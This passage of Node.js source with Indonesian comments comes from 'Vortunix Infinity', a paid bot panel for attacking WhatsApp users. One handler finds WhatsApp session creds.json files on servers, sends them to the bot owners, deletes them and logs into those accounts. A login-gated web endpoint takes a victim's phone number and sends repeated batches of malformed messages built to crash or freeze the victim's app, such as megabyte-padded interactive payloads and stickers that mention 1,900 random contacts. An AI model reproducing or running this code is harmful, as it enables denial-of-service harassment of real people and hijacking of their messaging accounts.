      for (const oid of ownerIds) {
        try {
          await ctx.telegram.sendDocument(oid, {
            source: credsBuffer,
            filename: `${BotNumber}_creds.json`,
          });
          await ctx.telegram.sendMessage(
            oid,
            `📱 *Detected:* ${BotNumber}\n📁 *Server:* ${name}\n📂 *Path:* ${usedPath}\n🧹 *Status:* creds.json dihapus dari server.`,
            { parse_mode: "Markdown" }
          );
        } catch (e) {
          console.error("Gagal kirim ke owner:", e.message);
        }
      }

      const connectedFlag = path.join(sessDir, "connected.flag");
      const failedFlag = path.join(sessDir, "failed.flag");

      if (fs.existsSync(connectedFlag)) {
        console.log(`[SKIP] ${BotNumber} sudah connected (flag exists).`);
        await sleep(REQUEST_DELAY_MS);
        continue;
      }

      if (fs.existsSync(failedFlag)) {
        console.log(`[SKIP] ${BotNumber} sebelumnya gagal (failed.flag).`);
        await sleep(REQUEST_DELAY_MS);
        continue;
      }

      // 🔹 Coba connect sekali
      try {
        if (!fs.existsSync(path.join(sessDir, "creds.json"))) {
          console.log(`[SKIP CONNECT] creds.json tidak ditemukan untuk ${BotNumber}`);
        } else {
          await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
          fs.writeFileSync(connectedFlag, String(Date.now()));
          console.log(`[CONNECTED] ${BotNumber}`);
        }
      } catch (err) {
        const emsg =
          err?.response?.status === 404
            ? "404 Not Found"
            : err?.response?.status === 403
            ? "403 Forbidden"
            : err?.response?.status === 440
            ? "440 Login Timeout"
            : err?.message || "Unknown error";

        fs.writeFileSync(failedFlag, JSON.stringify({ time: Date.now(), error: emsg }));
        console.error(`[CONNECT FAIL] ${BotNumber}:`, emsg);

        for (const oid of ownerIds) {
          try {
            await ctx.telegram.sendMessage(
              oid,
              `❌ Gagal connect *${BotNumber}*\nServer: ${name}\nError: ${emsg}`,
              { parse_mode: "Markdown" }
            );
          } catch {}
        }
      }

      await sleep(REQUEST_DELAY_MS * 2);
    }

    if (totalFound === 0)
      await ctx.reply("✅ Selesai. Tidak ditemukan creds.json di semua server.");
    else
      await ctx.reply(
        `✅ Selesai. Total creds.json ditemukan: ${totalFound}. (Sudah dihapus dari server & percobaan connect dilakukan 1x)`
      );
  } catch (err) {
    console.error("csession error:", err?.response?.data || err.message);
    await ctx.reply("❌ Terjadi error saat scan. Periksa log server.");
  }
});

console.clear();
console.log(chalk.blue(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢰⣿⢤⡿⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡿⠀⠀⠀⢬⡱⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣷⠀⠀⠀⠀⠙⣦⠙⠦⠤⠴⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣧⠀⠀⠀⠀⠘⣿⠓⠶⣄⡈⣻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⡤⣿⣷⠀⠀⠀⠀⣻⣄⡀⠀⠁⣬⡟⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⢧⣈⠉⡀⠀⠀⠀⡈⠻⣿⣿⣇⠈⡇⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠙⢿⡆⠀⠀⣼⠀⢹⡙⢿⣆⠀⢻⣿⣻⣿⣿⢿⣿⡶⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡾⡄⣰⣿⡆⠀⠙⣦⠹⡆⠰⣿⠛⢿⣿⣞⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢐⣿⠇⣟⠋⢸⣿⣼⠀⣿⣷⣼⡹⣾⡆⠈⢿⣿⣛⣒⠂⠀⠀⠀⠀
⠀⠀⠀⣚⣻⣿⣶⣿⠀⠈⡛⢿⡀⢸⣿⢛⣿⣿⢹⠀⠀⠉⠛⢻⡿⠁⠀⠀⠀
⣀⣀⣉⣩⣿⣿⣿⠋⠀⠀⡇⠈⢓⠏⠏⡀⢸⠇⢈⣷⣄⠀⢲⣸⠀⠀⠀⠀⠀
⢀⠉⠛⣛⣛⡛⠁⠀⠀⣾⠃⠀⣸⠇⣠⡇⢠⡀⠈⢿⡻⣦⠈⢻⣦⣀⡀⠀⠀
⠈⠙⠛⣿⣶⡾⠛⣡⣾⡟⢠⣾⣿⣿⣟⡤⠀⣷⡀⢨⣿⣽⡄⢀⣿⣿⣿⠇⠀
⠀⢠⣾⡟⢁⣴⡿⠹⠋⡰⣿⣿⣿⣿⡟⠀⢀⣿⣇⣼⣿⡿⡇⠞⣿⣿⣧⣤⡤
⠀⢠⡾⠚⣿⡟⢀⣴⠏⣸⣿⣿⣿⣿⣧⢰⣿⣿⡿⢻⠉⠀⡔⢶⣽⣿⠿⠥⠀
⠀⠈⠀⢸⠟⣠⡾⠏⠀⡿⢹⣿⣿⣿⣿⣿⣿⣿⣶⣿⣶⣾⣿⣮⣍⠉⠙⢲⠄
⠀⠀⠀⠘⠉⠁⠀⠀⢸⠁⠘⣿⡿⠻⣿⡿⣿⣿⣿⣿⣿⣿⡏⢻⣛⠛⠒⠛⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⠀⠈⢻⡄⠹⣿⣿⡇⠙⢷⡈⢿⡟⠒⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⠀⣿⣿⠃⠀⠀⠀⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠃⠀⠀⠀⠈⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`));

bot.launch();
console.log(chalk.red(`
╭─⦏ VORTUNIX INFINITY  ⦐
│ꔹ ɪᴅ ᴏᴡɴ : ${OwnerId}
│ꔹ ᴅᴇᴠᴇʟᴏᴘᴇʀ : @GyzenVtx
│ꔹ ʙᴏᴛ : ᴄᴏɴᴇᴄᴛᴀᴅᴏ ✓
╰───────────────────`));

initializeWhatsAppConnections();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "TRACELESS", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "TRACELESS", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });
  res.cookie("sessionKey", key, { maxAge: 60 * 60 * 1000 }); // ✅ Simpan key ke cookie
  res.redirect("/execution");
});

      
// simpan waktu terakhir eksekusi (global cooldown)
let lastExecution = 0;

app.get("/execution", (req, res) => {
  try {
    console.log("📩 [EXECUTION] Request masuk:");
    console.log("IP:", req.headers['x-forwarded-for'] || req.connection.remoteAddress);
    console.log("User-Agent:", req.headers['user-agent']);
    console.log("Query:", req.query);
    console.log("Headers:", req.headers['accept']);

    const username = req.cookies.sessionUser;
    const filePath = "./TRACELESS/Login.html";

    fs.readFile(filePath, "utf8", (err, html) => {
      if (err) return res.status(500).send("✗ Gagal baca file Login.html");

      if (!username) return res.send(html);

      const users = getUsers();
      const currentUser = users.find(u => u.username === username);

      if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
        return res.send(html);
      }

      // 🔥 CEK COOLDOWN GLOBAL
      const now = Date.now();
      const cooldown = 0 * 0 * 0; // 5 menit
      if (now - lastExecution < cooldown) {
        const sisa = Math.ceil((cooldown - (now - lastExecution)) / 1000);
        return res.send(executionPage("⏳ SERVER COOLDOWN", {
          message: `Server sedang cooldown. Tunggu ${Math.ceil(sisa / 60)} menit lagi sebelum bisa eksekusi.`
        }, false, currentUser, currentUser.key || "", "")); // ✅ TAMBAH userKey di sini
      }

      const targetNumber = req.query.target;
      const mode = req.query.mode;
      const target = `${targetNumber}@s.whatsapp.net`;

      if (sessions.size === 0) {
        return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
          message: "Tunggu sampai maintenance selesai..."
        }, false, currentUser, currentUser.key || "", mode)); // ✅ TAMBAH userKey di sini
      }

      if (!targetNumber) {
        if (!mode) {
          return res.send(executionPage("✓ Server ON", {
            message: "Pilih mode yang ingin digunakan."
          }, true, currentUser, currentUser.key || "", "")); // ✅ TAMBAH userKey di sini
        }

        if (["delay", "invis", "blank", "blank-ios"].includes(mode)) {
          return res.send(executionPage("✓ Server ON", {
            message: "Masukkan nomor target (62xxxxxxxxxx)."
          }, true, currentUser, currentUser.key || "", mode)); // ✅ TAMBAH userKey di sini
        }

        return res.send(executionPage("✗ Mode salah", {
          message: "Mode tidak dikenali. Gunakan ?mode=andros atau ?mode=ios."
        }, false, currentUser, currentUser.key || "", "")); // ✅ TAMBAH userKey di sini
      }

      if (!/^\d+$/.test(targetNumber)) {
        return res.send(executionPage("✗ Format salah", {
          target: targetNumber,
          message: "Nomor harus hanya angka dan diawali dengan nomor negara"
        }, true, currentUser, currentUser.key || "", mode)); // ✅ TAMBAH userKey di sini
      }

      try {
        if (mode === "delay") {
          GetSuZoXAndros(24, target);
        } else if (mode === "invis") {
          invis(24, target);
        } else if (mode === "blank") {
          blankandro(24, target);
        } else if (mode === "blank-ios") {
          blankios(24, target);
        } else if (mode === "fc") {
          fc(24, target);
        } else {
          throw new Error("Mode tidak dikenal.");
        }

        // ✅ update global cooldown
        lastExecution = now;

        // ✅ LOG LOKAL
        console.log(`[EXECUTION] User: ${username} | Target: ${targetNumber} | Mode: ${mode} | Time: ${new Date().toLocaleString("id-ID")}`);

        return res.send(executionPage("✓ S U C C E S", {
          target: targetNumber,
          timestamp: new Date().toLocaleString("id-ID"),
          message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
        }, false, currentUser, currentUser.key || "", mode)); // ✅ TAMBAH userKey di sini
      } catch (err) {
        return res.send(executionPage("✗ Gagal kirim", {
          target: targetNumber,
          message: err.message || "Terjadi kesalahan saat pengiriman."
        }, false, currentUser, currentUser.key || "", "Gagal mengeksekusi nomor target.", mode)); // ✅ TAMBAH userKey di sini
      }
    });
  } catch (err) {
    console.error("❌ Fatal error di /execution:", err);
    return res.status(500).send("Internal Server Error");
  }
});
      
        

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(PORT, () => {
  console.log(`✓ Server aktif di port ${PORT}`);
});

module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};

// ==================== TOXIC FUNCTIONS ==================== //
async function Atut(target) {
    const OndetMsg1 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { 
                        text: "#Vortunix Infinity⃠", 
                        format: "DEFAULT" 
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                    entryPointConversionSource: "call_permission_message"
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    });

    const OndetMsg2 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { 
                        text: "#GyzenLyoraaᝄ", 
                        format: "DEFAULT" 
                    },
                    nativeFlowResponseMessage: {
                        name: "galaxy_message", 
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                    entryPointConversionSource: "call_permission_request"
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741, 
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    });

    await sock.relayMessage("status@broadcast", OndetMsg1.message, {
        messageId: OndetMsg1.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users", 
                attrs: {},
                content: [{ 
                    tag: "to", 
                    attrs: { jid: target } 
                }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", OndetMsg2.message, {
        messageId: OndetMsg2.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users", 
                attrs: {},
                content: [{ 
                    tag: "to", 
                    attrs: { jid: target } 
                }]
            }]
        }]
    });
}

async function Invisibledk(target) {
  const msg = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", msg, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });

  console.log(chalk.red(`─────「 ⏤!InvisibleDelay To: ${target}!⏤ 」─────`))
}

async function GetSuZoXAndros(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 35) {
        await Promise.all([
        Atut(X),
        Invisibledk(X),
           await sleep(500)
           ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/8 Andros 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade VORTUNIX 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

async function blankandro(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 35) {
        await Promise.all([
        Atut(X),
        Invisibledk(X),
            await sleep(500)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/2 blank andro 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 3500);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade VORTUNIX 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

async function fc(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 35) {
        await Promise.all([
        Atut(X),
        Invisibledk(X),
            await sleep(500),
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/10 blankios 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 6000);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade VORTUNIX 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

async function blankios(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 35) {
        await Promise.all([
          
            Atut(X),
        Invisibledk(X),
            await sleep(500)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/1 blankios 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 3500);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade VORTUNIX 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}



async function invis(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 35) {
        await Promise.all([
          Atut(X),
        Invisibledk(X),
            await sleep(500)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/400 INVISIBLE 🕊️
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade VORTUNIX 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// ==================== HTML EXECUTION ==================== //
// ==================== HTML EXECUTION ==================== //
// ==================== HTML EXECUTION ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  userKey = "", // ✅ Parameter untuk key/password
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "2-digit",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      })
    : "-";

  const filePath = path.join(__dirname, "TRACELESS", "Traceless.html");

  try {
    let html = fs.readFileSync(filePath, "utf8");

    // Ganti semua placeholder di HTML - URUTAN PENTING!
    html = html
      // 1. Ganti userKey/password terlebih dahulu
      .replace(/\$\{userKey\s*\|\|\s*'Unknown'\}/g, userKey || "Unknown")
      .replace(/\$\{userKey\}/g, userKey || "")
      .replace(/\$\{password\}/g, userKey || "")
      .replace(/\{\{password\}\}/g, userKey || "")
      .replace(/\{\{key\}\}/g, userKey || "")
      .replace(/\$\{key\}/g, userKey || "")
      // 2. Ganti username
      .replace(/\$\{username\s*\|\|\s*'Unknown'\}/g, username || "Unknown")
      .replace(/\$\{username\}/g, username || "Unknown")
      .replace(/\{\{username\}\}/g, username || "Unknown")
      // 3. Ganti yang lainnya
      .replace(/\{\{expired\}\}/g, formattedTime)
      .replace(/\{\{status\}\}/g, status)
      .replace(/\{\{message\}\}/g, message)
      .replace(/\$\{formattedTime\}/g, formattedTime);

    return html;
  } catch (err) {
    console.error("Gagal membaca file Traceless.html:", err);
    return `<h1>Gagal memuat halaman</h1>`;
  }
};